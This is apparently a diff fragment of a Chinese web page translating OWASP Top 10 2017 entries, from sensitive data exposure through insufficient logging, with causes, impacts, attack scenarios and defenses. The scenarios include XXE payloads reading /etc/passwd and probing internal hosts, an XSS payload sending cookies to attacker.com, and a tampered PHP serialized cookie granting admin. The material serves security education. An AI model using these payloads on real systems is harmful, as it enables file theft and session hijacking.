+<h2 id="危害-3"><a class="markdownIt-Anchor" href="#危害-3"></a> 危害</h2>
+<p>泄露敏感信息 通常情况下，这些数据 通常包括很多个人敏感信息（PII）， 例如：医疗记录、认证凭证、个人隐私、信用卡信息等。</p>
+<h2 id="攻击案例场景-3"><a class="markdownIt-Anchor" href="#攻击案例场景-3"></a> 攻击案例场景</h2>
+<p>场景 #1： 一个应用程序使用自动化的数据加密系统加密信用卡信息，并存储在数据库中。但是，当数据被检索时被自动解密，这就使得SQL注入漏洞能够以明文形式获得所有信用卡卡号。</p>
+<p>场景 #2： 一个网站上对所有网页没有使用或强制使用TLS，或者使用弱加密。攻击者通过监测网络流量（如：不安全的无线网络），将网络连接从HTTPS降级到HTTP，就可以截取请求并窃取用户会话cookie。 之后，攻击者可以复制用户cookie并成功劫持经过认证的用户会话、访问或修改用户个人信息。除此之外，攻击者还可以更改所有传输过程中的数据，例如：转款的接接收者。</p>
+<p>场景 #3： 密码数据库使用未加盐的哈希算法或弱哈希算法去存储每个人的密码。一个文件上传漏洞使黑客能够获取密码文件。所有这些未加盐哈希的密码通过彩虹表暴力破解方式破解。 由简单或快速散列函数生成加盐的哈希，也可以通过GPU破解。</p>
+<h2 id="预防措施-3"><a class="markdownIt-Anchor" href="#预防措施-3"></a> 预防措施</h2>
+<ul>
+<li>对系统处理、存储或传输的数据分类，并根据分类进行访问控制。</li>
+<li>熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保护敏感数据。</li>
+<li>对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过PCI DSS标记或拦截。未存储的数据不能被窃取。</li>
+<li>确保存储的所有敏感数据被加密。</li>
+<li>确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，并且密钥管理到位。</li>
+<li>确保传输过程中的数据被加密，如：使用TLS。 确保数据加密被强制执行，如：使用HTTP严格安全传输协议（HSTS ）。</li>
+<li>禁止缓存对包含敏感数据的响应。</li>
+<li>确保使用密码专用算法存储密码，如： Argon2 、 scrypt 、bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受范围。</li>
+<li>单独验证每个安全配置项的有效性。</li>
+</ul>
+<h1 id="xml外部实体xxe"><a class="markdownIt-Anchor" href="#xml外部实体xxe"></a> XML外部实体（XXE）</h1>
+<p>许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p>
+<h2 id="漏洞成因-4"><a class="markdownIt-Anchor" href="#漏洞成因-4"></a> 漏洞成因</h2>
+<ul>
+<li>您的应用程序直接接受XML文件或者接受XML文件上传，特别是来自不受信任源的文件，或者将不受信任的数据插入XML文件，并提交给XML处理器解析。</li>
+<li>在应用程序或基于Web服务的SOAP中，所有XML处理器都启用了文档类型定义（DTDs） 。因为禁用DTD进程的确切机制因处理器而不同，更多资料请参考： 《OWASP Cheat Sheet ‘XXEPrevention‘ 》 。</li>
+<li>如果为了实现安全性或单点登录（SSO），您的应用程序使用SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用程序就容易受到XXE攻击。</li>
+<li>如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传递到SOAP框架，那么它可能受到XXE攻击。</li>
+<li>存在XXE缺陷的应用程序更容易受到拒绝服务攻击，包括：Billion Laughs 攻击。</li>
+</ul>
+<h2 id="检测方法-2"><a class="markdownIt-Anchor" href="#检测方法-2"></a> 检测方法</h2>
+<p>SAST 工具可以通过检查依赖项和安全配置来发现 XXE缺陷。 DAST工具需要额外的手动步骤来检测和利用XXE缺陷。</p>
+<h2 id="漏洞位置-4"><a class="markdownIt-Anchor" href="#漏洞位置-4"></a> 漏洞位置</h2>
+<p>默认情况下，许多旧的XML处理器能够对外部实体、 XML进程中被引用和评估的URI进行规范。</p>
+<h2 id="危害-4"><a class="markdownIt-Anchor" href="#危害-4"></a> 危害</h2>
+<p>XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。</p>
+<h2 id="攻击案例场景-4"><a class="markdownIt-Anchor" href="#攻击案例场景-4"></a> 攻击案例场景</h2>
+<p>场景 #1：攻击者尝试从服务端提取数据：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>场景 #2：攻击者通过将上面的实体行更改为以下内容来探测服务器的专用网络：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"https://192.168.1.1/private"</span> &gt;</span>]&gt;<br></code></pre></td></tr></table></figure>
+<p>场景 #3：攻击者通过恶意文件执行拒绝服务攻击：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///dev/random"</span> &gt;</span>]&gt;<br></code></pre></td></tr></table></figure>
+<h2 id="预防措施-4"><a class="markdownIt-Anchor" href="#预防措施-4"></a> 预防措施</h2>
+<ul>
+<li>尽可能使用简单的数据格式（如： JSON），避免对敏感数据进行序列化。</li>
+<li>及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高版本。</li>
+<li>参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》 ，在应用程序的所有XML解析器中禁用XML外部实体和DTD进程。</li>
+<li>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。</li>
+<li>验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。</li>
+<li>尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞。</li>
+</ul>
+<h1 id="失效的访问控制"><a class="markdownIt-Anchor" href="#失效的访问控制"></a> 失效的访问控制</h1>
+<p>未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p>
+<h2 id="漏洞成因-5"><a class="markdownIt-Anchor" href="#漏洞成因-5"></a> 漏洞成因</h2>
+<p>访问控制强制实施策略，使用户无法在其预期的权限之外执行行为。失败的访问控制通常导致未经授权的信息泄露、修改或销毁所有数据、或在用户权限之外执行业务功能。常见的访问控制脆弱点包括：</p>
+<ul>
+<li>通过修改 URL、内部应用程序状态或 HTML 页面绕过访问控制检查，或简单地使用自定义的 API 攻击工具。</li>
+<li>允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。</li>
+<li>特权提升。在不登录的情况下假扮用户，或以用户身份登录时充当管理员。</li>
+<li>元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权限的cookie 或隐藏字段。</li>
+<li>CORS配置错误允许未授权的API访问。</li>
+<li>以未通过身份验证的用户身份强制浏览的通过身份验证时才能看到的页面、或作为标准用户访问具有相关权限的页面、或API没有对POST、 PUT和DELETE强制执行访问控制。</li>
+</ul>
+<h2 id="检测方法-3"><a class="markdownIt-Anchor" href="#检测方法-3"></a> 检测方法</h2>
+<p>SAST 工具和 DAST 工具可以检测到访问控制的缺失，但 不能验证其功能是否正常。访问控制 可通过手动方式检测，或在某些特定框架下通过自动化检测访问控制缺失。由于缺乏自动化的检测和应用程序开发人员缺乏有效 的功能测试，因而访问控制缺陷很常。 访问控制检测通常不适用于自动化的静态或动态测试。 手动测试是检测访问控制缺失或失效的最佳方法，包 括： HTTP方法（如： GET和PUT）、控制器、直接对象引用等。</p>
+<h2 id="危害-5"><a class="markdownIt-Anchor" href="#危害-5"></a> 危害</h2>
+<p>技术影响是攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、 访问、更新或删除任何记录。 业务影响取决于应用程序和数据的保护需求。</p>
+<h2 id="攻击案例场景-5"><a class="markdownIt-Anchor" href="#攻击案例场景-5"></a> 攻击案例场景</h2>
+<p>场景 #1：应用程序在访问帐户信息的 SQL调用中使用了未经验证的数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">pstmt.setString(1， request.getParameter(&quot;acct&quot;));<br>ResultSet results &#x3D; pstmt.executeQuery( );<br></code></pre></td></tr></table></figure>
+<p>攻击者只需修改浏览器中的“acct”参数即可发送他们想要的任何帐号信息。如果没有正确验证，攻击者可以访问任何用户的帐户。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">http:&#x2F;&#x2F;example.com&#x2F;app&#x2F;accountInfo?acct&#x3D;notmyacct<br></code></pre></td></tr></table></figure>
+<p>场景 #2：攻击者仅强制浏览目标URL。管理员权限是访问管理页面所必需的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">http:&#x2F;&#x2F;example.com&#x2F;app&#x2F;getappInfo<br>http:&#x2F;&#x2F;example.com&#x2F;app&#x2F;admin_getappInfo<br></code></pre></td></tr></table></figure>
+<p>如果一个未经身份验证的用户可以访问任何页面，那么这是一个缺陷。如果一个非管理员权限的用户可以访问管理页面，那么这同样也是一个缺陷。</p>
+<h2 id="预防措施-5"><a class="markdownIt-Anchor" href="#预防措施-5"></a> 预防措施</h2>
+<p>访问控制只有在受信服务器端代码或没有服务器的 API 中有效，这样这样攻击者才无法修改访问控制检查或元数据。</p>
+<ul>
+<li>除公有资源外，默认情况下拒绝访问。</li>
+<li>使用一次性的访问控制机制，并在整个应用程序中不断重用它们，包括最小化CORS使用。</li>
+<li>建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。</li>
+<li>域访问控制对每个应用程序都是唯一的，但业务限制要求应由域模型强制执行。</li>
+<li>禁用 Web服务器目录列表，并确保文件元数据（如： git）不存在于 Web的根目录中。</li>
+<li>记录失败的访问控制，并在适当时向管理员告警（如：重复故障）。</li>
+<li>对API和控制器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害。</li>
+<li>当用户注销后，服务器上的JWT令牌应失效。</li>
+</ul>
+<h1 id="安全配置错误"><a class="markdownIt-Anchor" href="#安全配置错误"></a> 安全配置错误</h1>
+<p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p>
+<h2 id="漏洞成因-6"><a class="markdownIt-Anchor" href="#漏洞成因-6"></a> 漏洞成因</h2>
+<ul>
+<li>应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的权限配置错误。</li>
+<li>应用程序启用或安装了不必要的功能（例如：不必要的端口、服务、网页、帐户或权限）。</li>
+<li>默认帐户的密码仍然可用且没有更改。</li>
+<li>错误处理机制向用户披露堆栈跟踪或其他大量错误信息。</li>
+<li>对于更新的系统，禁用或不安全地配置最新的安全功能。</li>
+<li>应用程序服务器、应用程序框架（如： Struts、 Spring、<br />
+<a href="http://ASP.NET" target="_blank" rel="noopener">ASP.NET</a>）、库文件、数据库等没有进行安全配置。</li>
+<li>服务器不发送安全标头或指令，或者未对服务器进行安全配置。</li>
+<li>您的应用软件已过期或易受攻击（参见A9： 2017-使用含有已知漏洞的组件）。</li>
+</ul>
+<h2 id="检测方法-4"><a class="markdownIt-Anchor" href="#检测方法-4"></a> 检测方法</h2>
+<p>自动扫描器可用于检测错误的安全配置、默 认帐户的使用或配置、不必要的服务、遗留选项等。</p>
+<h2 id="漏洞位置-5"><a class="markdownIt-Anchor" href="#漏洞位置-5"></a> 漏洞位置</h2>
+<p>安全配置错误可以发生在一个应用程序堆栈的任何层面，包括网络服务、平台、 Web服务器、应用服务器、 数据库、框架、自定义代码和预安装的虚拟机、容器 和存储。</p>
+<h2 id="危害-6"><a class="markdownIt-Anchor" href="#危害-6"></a> 危害</h2>
+<p>这些漏洞使攻击者能经常访问一些未授权的系统数据或功能。有时，这些漏洞导致系统的完全攻破。 业务影响取决于您的应用程序和数据的保护需求。</p>
+<h2 id="攻击案例场景-6"><a class="markdownIt-Anchor" href="#攻击案例场景-6"></a> 攻击案例场景</h2>
+<p>场景#1：应用程序服务器附带了未从产品服务器中删除的应用程序样例。这些样例应用程序具有已知的安全漏洞，攻击者利用这些漏洞来攻击服务器。如果其中一个应用程序是管理员控制台，并且没有更改默认账户，攻击者就可以通过默认密码登录，从而接管服务器。<br />
+场景#2：目录列表在服务器端未被禁用。攻击者发现他们很容易就能列出目录列表。攻击者找到并下载所有已编译的Java类，他们通过反编译来查看代码。然后，攻击者在应用程序中找到一个严重的访问控制漏洞。<br />
+场景#3：应用服务器配置允许将详细的错误信（如：堆栈跟踪信息）返回给用户，这可能会暴露敏感信息或潜在的漏洞，如：已知含有漏洞的组件的版本信息。<br />
+场景#4：云服务向其他CSP用户提供默认的网络共享权限。这允许攻击者访问存储在云端的敏感数据</p>
+<h2 id="预防措施-6"><a class="markdownIt-Anchor" href="#预防措施-6"></a> 预防措施</h2>
+<ul>
+<li>一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。开发、质量保证和生产环境都应该进行相同配置，并且，在每个环境中使用不同的密码。这个过程应该是自动化的，以尽量减少安装一个新安全环境的耗费。</li>
+<li>搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和示例。移除或不安装不适用的功能和框架。</li>
+<li>检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分，（参见A9： 2017-使用含有已知漏洞的组件）。在检查过程中，应特别注意云存储权限（如：S3桶权限）。</li>
+<li>一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。</li>
+<li>向客户端发送安全指令，如： 安全标头。</li>
+<li>在所有环境中能够进行正确安全配置和设置的自动化过程。</li>
+</ul>
+<h1 id="跨站脚本xss"><a class="markdownIt-Anchor" href="#跨站脚本xss"></a> 跨站脚本（XSS）</h1>
+<p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。 XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p>
+<h2 id="漏洞成因-7"><a class="markdownIt-Anchor" href="#漏洞成因-7"></a> 漏洞成因</h2>
+<p>存在三种XSS类型，通常针对用户的浏览器：<br />
+<strong>反射式XSS</strong>： 应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。 通常，用户将需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站，广告或类似内容。<br />
+<strong>存储式XSS：</strong> 你的应用或者API将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一般被认为是高危或严重的风险。<br />
+<strong>基于DOM的XSS</strong>： 会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的来说，你应该避免将攻击者可控的数据发送给不安全的JavaScript<br />
+API。<br />
+典型的XSS攻击可导致盗取session、账户、绕过MFA、 DIV替换、对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其他用户侧的攻击。</p>
+<h2 id="检测方法-5"><a class="markdownIt-Anchor" href="#检测方法-5"></a> 检测方法</h2>
+<p>自动化工具能自动发现一些XSS问题，特别是在一些成熟的技术中，如： PHP、 J2EE或JSP、 <a href="http://ASP.NET" target="_blank" rel="noopener">ASP.NET</a></p>
+<h2 id="危害-7"><a class="markdownIt-Anchor" href="#危害-7"></a> 危害</h2>
+<p>XSS对于反射和DOM的影响是中等的，而对于存储的XSS， XSS的 影响更为严重，譬如在受攻击者的 浏览器上执行远程代码，例如：窃取凭证和会话或传递恶意软件等。</p>
+<h2 id="攻击案例场景-7"><a class="markdownIt-Anchor" href="#攻击案例场景-7"></a> 攻击案例场景</h2>
+<p>场景#1： 应用程序在下面HTML代码段的构造中使用未经验证或转义的不可信的数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">(String) page +&#x3D; &quot;&lt;input name&#x3D;&#39;creditcard&#39; type&#x3D;&#39;TEXT‘<br>value&#x3D;&#39;&quot; + request.getParameter(&quot;CC“) + &quot;&#39;&gt;&quot;;<br></code></pre></td></tr></table></figure>
+<p>攻击者在浏览器中修改“CC” 参数为如下值：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">&#39;&gt;&lt;script&gt;document.location&#x3D;<br>&#39;http:&#x2F;&#x2F;www.attacker.com&#x2F;cgi-bin&#x2F;cookie.cgi?<br>foo&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;&#39;.<br></code></pre></td></tr></table></figure>
+<p>这个攻击导致受害者的会话ID被发送到攻击者的网站， 使得攻击者能够劫持用户当前会话。<br />
+注意：攻击者同样能使用跨站脚本攻破应用程序可能使用的任何跨站请求伪造（ CSRF） 防御机制。 CSRF的详细情况见2013年版中的A8项。</p>
+<h2 id="预防措施-7"><a class="markdownIt-Anchor" href="#预防措施-7"></a> 预防措施</h2>
+<p>防止XSS需要将不可信数据与动态的浏览器内容区分开。 这可以通过如下步骤实现：</p>
+<ul>
+<li>使用设计上就会自动编码来解决XSS问题的框架，如： Ruby 3.0或 React JS。了解每个框架的XSS保护的局限性，并适当地处理未覆盖的用例。</li>
+<li>为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML输出的上下文（包括：主体、属性、 JavaScript、 CSS或URL）对所有不可信的HTTP请求数据进行恰当的转义 。 更多关于数据<br />
+转义技术的信息见： 《OWASP Cheat Sheet ‘XSS Prevention’》</li>
+<li>在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。 如果这种情况不能避免，可以采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》描述的类似上下文敏感的转义技术应用于浏览器API。</li>
+<li>使用内容安全策略（CSP） 是对抗XSS的深度防御策略。如果不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有效的。</li>
+</ul>
+<h1 id="不安全的反序列化"><a class="markdownIt-Anchor" href="#不安全的反序列化"></a> 不安全的反序列化</h1>
+<p>不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p>
+<h2 id="漏洞成因-8"><a class="markdownIt-Anchor" href="#漏洞成因-8"></a> 漏洞成因</h2>
+<p>如果反序列化进攻者提供的敌意或者篡改过的对象将会使将应用程序和API变的脆弱。<br />
+这可能导致两种主要类型的攻击 ：</p>
+<ul>
+<li>如果应用中存在可以在反序列化过程中或者之后被改变行为的类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我们将其称为对象和数据结构攻击。</li>
+<li>典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有的数据结构，但内容发生了变化。</li>
+</ul>
+<p>在应用程序中，序列化可能被用于:</p>
+<ul>
+<li>远程和进程间通信（RPC / IPC）</li>
+<li>连线协议、 Web服务、消息代理</li>
+<li>缓存/持久性</li>
+<li>数据库、缓存服务器、文件系统</li>
+<li>HTTP cookie、 HTML表单参数、 API身份验证令牌</li>
+</ul>
+<h2 id="检测方法-6"><a class="markdownIt-Anchor" href="#检测方法-6"></a> 检测方法</h2>
+<p>依靠经验进行检测</p>
+<h2 id="漏洞位置-6"><a class="markdownIt-Anchor" href="#漏洞位置-6"></a> 漏洞位置</h2>
+<p>底层代码</p>
+<h2 id="危害-8"><a class="markdownIt-Anchor" href="#危害-8"></a> 危害</h2>
+<p>反序列化缺陷的影响不能被低估。它们可能导致远程代码执行攻击，这是 可能发生的最严重的攻击之一。 业务影响取决于应用程序和数据的保护需求。</p>
+<h2 id="攻击案例场景-8"><a class="markdownIt-Anchor" href="#攻击案例场景-8"></a> 攻击案例场景</h2>
+<p>场景 #1：一个React应用程序调用了一组Spring Boot微服务。作为功能性程序员，他们试图确保他们的代码是不可变的。他们提出的解决方法是序列化用户状态，并在每次请求时来回传。攻击者注意到了“R00” Java对象签名，并使用Java Serial Killer工具在应用服务器上获得远程代码执行。<br />
+场景 #2：一个PHP论坛使用PHP对象序列化来保存一个“超级” cookie。该cookie包含了用户的用户ID、角色、密码哈希和其他状态：<br />
+a:4:{i:0;i:132;i:1;s:7:“Mallory”;i:2;s:4:“user”;i:3;s:32:“b6a8b3bea87fe0e05022f8f3c88bc960”;}<br />
+攻击者更改序列化对象以授予自己为admin权限：<br />
+a:4:{i:0;i:1;i:1;s:5:“Alice”;i:2;s:5:“admin”;i:3;s:32:“b6a8b3bea87fe0e05022f8f3c88bc960”;}</p>
+<h2 id="预防措施-8"><a class="markdownIt-Anchor" href="#预防措施-8"></a> 预防措施</h2>
+<p>唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。</p>
+<p>如果上述不可能的话，考虑使用下述方法：</p>
+<ul>
+<li>执行完整性检查，如：任何序列化对象的数字签名，以防止恶意对象创建或数据篡改。</li>
+<li>在创建对象之前强制执行严格的类型约束，因为代码通常被期望成一组可定义的类。绕过这种技术的方法已经被证明，所以完全依赖于它是不可取的。</li>
+<li>如果可能，隔离运行那些在低特权环境中反序列化的代码。</li>
+<li>记录反序列化的例外情况和失败信息，如：传入的类型不是预期的类型，或者反序列处理引发的例外情况。</li>
+<li>限制或监视来自于容器或服务器传入和传出的反序列化网络连接。</li>
+<li>监控反序列化，当用户持续进行反序列化时，对用户进行警告。</li>
+</ul>
+<h1 id="使用含有已知漏洞的组件"><a class="markdownIt-Anchor" href="#使用含有已知漏洞的组件"></a> 使用含有已知漏洞的组件</h1>
+<p>组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p>
+<h2 id="漏洞成因-9"><a class="markdownIt-Anchor" href="#漏洞成因-9"></a> 漏洞成因</h2>
+<p>如果你不知道所有使用的组件版本信息（包括：服务端和客户端）。这包括了直接使用的组件或其依赖的组件。</p>
+<ul>
+<li>如果软件易受攻击，不再支持或者过时。这包括： OS、 Web服务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、API和所有的组件、运行环境和库。</li>
+<li>如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。</li>
+<li>如果你不基于风险并及时修复或升级底层平台、框架和依赖库。很可能发生这种情况：根据变更控制，每月或每季度进行升级，这使得组织在这段时间内会受到已修复但未修补的漏洞的威胁。</li>
+<li>如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼容性测试。</li>
+<li>如果你没有对组件进行安全配置（请参考“A6:2017-安全配置错误”）。</li>
+</ul>
+<h2 id="检测方法-7"><a class="markdownIt-Anchor" href="#检测方法-7"></a> 检测方法</h2>
+<p>如Retire.js之类的扫描器可以帮助发现此类漏洞，但这 类漏洞是否可以被利用还需花费额外的时间去研究。</p>
+<h2 id="危害-9"><a class="markdownIt-Anchor" href="#危害-9"></a> 危害</h2>
+<p>虽然对于一些已知的漏洞其影响很小， 但目前很多严重的安全事件都是利用组件中的已知漏洞。根据你所要保护的资产，此类风险等级可能会很高。</p>
+<h2 id="攻击案例场景-9"><a class="markdownIt-Anchor" href="#攻击案例场景-9"></a> 攻击案例场景</h2>
+<p>场景 #1： 很多时候组件都是以与应用相同的权限运行的，这使得组件里的缺陷可能导致各式各样的问题。这些缺陷可能是偶然的（如：编码错误），也可能是蓄意的（如：组件里的后门）。下面是一些已被利用的漏洞：<br />
+• CVE-2017-5638，一个Struts2远程执行漏洞。 可在服务端远程执行代码，并已造成巨大的影响。<br />
+• 虽然物联网（IoT） 设备一般难以通过打补丁来修复。但对之打补丁非常重要（如：医疗设备）。<br />
+有些自动化工具能帮助攻击者发现未打补丁的或配置不正确的系统。例如 ： Shodan IOT搜索引擎能帮助你发现从2014年四月至今仍存在心脏出血漏洞 的设备。</p>
+<h2 id="预防措施-9"><a class="markdownIt-Anchor" href="#预防措施-9"></a> 预防措施</h2>
+<ul>
+<li>
+<p>移除不使用的依赖、不需要的功能、组件、文件和文档。</p>
+</li>
+<li>
+<p>利用如 versions、 DependencyCheck 、 retire.js等工具来持续的记录客户端和服务器端以及它们的依赖库的版本信息。持续监控如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警告邮件。</p>
+</li>
+<li>
+<p>仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险</p>
+</li>
+<li>
+<p>监控那些不再维护或者不发布安全补丁的库和组件。如果不能打补丁，可以考虑部署虚拟补丁来监控、检测或保护。</p>
+</li>
+</ul>
+<pre><code>每个组织都应该制定相应的计划，对整个软件生命周期进行监控、评审、升级或更改配置。  
+</code></pre>
+<h1 id="不足的日志记录和监控"><a class="markdownIt-Anchor" href="#不足的日志记录和监控"></a> 不足的日志记录和监控</h1>
+<p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p>
+<h2 id="漏洞成因-10"><a class="markdownIt-Anchor" href="#漏洞成因-10"></a> 漏洞成因</h2>
+<p>下列情况会导致不足的日志记录、检测、监控和响应 ：</p>
+<ul>
+<li>未记录可审计性事件，如：登录、登录失败和高额交易。<br />
+告警和错误事件未能产生或产生不足的和不清晰的日志信息。</li>
+<li>没有利用应用系统和API的日志信息来监控可疑活动。</li>
+<li>日志信息仅在本地存储。</li>
+<li>没有定义合理的告警阈值和制定响应处理流程。</li>
+<li>渗透测试和使用DAST工具（如： OWASP ZAP）扫描没有触发告警</li>
+<li>对于实时或准实时的攻击，应用程序无法检测、处理和告警。</li>
+</ul>
+<p>如果你的应用使得日志信息或告警信息对用户或者攻击者可见，你就很容易遭受信息泄露攻击（请参考A3： 2017-敏感信息泄露）</p>
+<h2 id="检测方法-8"><a class="markdownIt-Anchor" href="#检测方法-8"></a> 检测方法</h2>
+<p>足够监控的一个策略是在渗透测试后检 查日志。 测试者的活动应被充分的记录下来，能够反 映出他们造成了什么样的影响。</p>
+<h2 id="危害-10"><a class="markdownIt-Anchor" href="#危害-10"></a> 危害</h2>
+<p>多数成功的攻击往往从漏洞探测开始。 允许这种探测会将攻击成功的可能性 提高到近100% 据统计，在2016年确定一起数据泄露 事件平均需要花191天时间，这么长时间里损害早已发生。</p>
+<h2 id="攻击案例场景-10"><a class="markdownIt-Anchor" href="#攻击案例场景-10"></a> 攻击案例场景</h2>
+<p>场景#1：一个由小团队运营的开源项目论坛软件被攻击者利用其内在漏洞攻陷了。 攻击者设法删除了包含下一个版本的内部源代码仓库以及所有论坛内容。 虽然代码可以恢复，但由于缺乏监控、日志记录和告警导致了更糟糕的结果。 由于此问题，该论坛软件项目不再活跃。<br />
+场景#2：攻击者使用通用密码进行用户扫描并能获取所有使用此密码的账户。对于其他账户而言，将仅有一次失败的登陆尝试记录。一段时间以后，攻击者可以用另一个密码再次进行此活动。<br />
+场景#3：美国的一家大型零售商据内部使用恶意软件分析沙箱做分析。 沙箱软件检测到了一些可能不需要的软件，但没有人响应此次检测。 在一个境外银行不正当的信用卡交易被检测到之前，该沙箱软件一直在产生告警信息。</p>
+<h2 id="预防措施-10"><a class="markdownIt-Anchor" href="#预防措施-10"></a> 预防措施</h2>
+<p>根据应用程序存储或处理的数据的风险：</p>
+<ul>
+<li>确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。</li>
+<li>确保日志以一种能被集中日志管理解决方案使用的形式生成</li>
+<li>确保高额交易有完整性控制的审计信息，以防止篡改或删除，例如审计信息保存在只能进行记录增加的数据库表中。</li>
+<li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。</li>
+<li>建立或采取一个应急响应机制和恢复计划，例如： NIST 800-61 rev 2或更新版本。</li>
+</ul>
+<p>目前已有商业的和开源的应用程序防护框架（例如： OWASP AppSensor）、 Web应用防火墙（例如 ： Modsecurity with the OWASP Core Rule Set）、带有自定义仪表盘和告警功能的日志关联软件。</p>
